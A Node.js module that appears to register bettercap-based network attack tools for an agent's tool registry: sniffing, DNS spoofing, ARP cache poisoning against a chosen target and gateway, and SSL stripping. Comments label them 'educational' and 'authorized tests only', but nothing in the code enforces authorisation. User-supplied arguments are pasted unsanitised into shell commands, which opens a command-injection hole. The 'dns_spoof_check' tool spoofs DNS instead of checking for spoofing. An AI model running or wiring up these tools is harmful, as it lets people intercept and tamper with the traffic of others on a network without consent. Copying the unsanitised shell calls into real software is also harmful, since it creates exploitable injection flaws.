'use strict';
const { execSync } = require('child_process');
const registry = require('./registry');
const { ensureTool } = require('./tool_installer');

// Bettercap - MITM toolkit
registry.register('bettercap_scan', async ({ interface }) => {
  await ensureTool('bettercap', 'bettercap', 'pkg');
  try {
    return execSync(`bettercap -if ${interface || 'wlan0'} -eval "net.probe on; net.sniff on"`).toString();
  } catch (e) { return `Bettercap error: ${e.message}`; }
}, 'network attack framework. args: interface (optional)');

// DNS spoofing (educational)
registry.register('dns_spoof_check', async ({ target }) => {
  await ensureTool('bettercap', 'bettercap', 'pkg');
  try {
    return execSync(`bettercap -if ${target || 'wlan0'} -eval "dns.spoof on"`).toString();
  } catch (e) { return `DNS spoof error: ${e.message}`; }
}, 'DNS spoofing (authorized tests only). args: target (optional)');

// ARP poisoning (educational)
registry.register('arp_poison', async ({ target, gateway }) => {
  await ensureTool('bettercap', 'bettercap', 'pkg');
  try {
    return execSync(`bettercap -if wlan0 -eval "arp.spoof on; set arp.spoof.targets ${target}; set arp.spoof.gateway ${gateway || '192.168.1.1'}"`).toString();
  } catch (e) { return `ARP poison error: ${e.message}`; }
}, 'ARP cache poisoning (authorized tests). args: target, gateway (optional)');

// SSL strip (educational)
registry.register('ssl_strip', async ({ interface }) => {
  await ensureTool('bettercap', 'bettercap', 'pkg');
  try {
    return execSync(`bettercap -if ${interface || 'wlan0'} -eval "sslstrip on"`).toString();
  } catch (e) { return `SSL strip error: ${e.message}`; }
}, 'SSL stripping (authorized tests). args: interface (optional)');

module.exports = {};
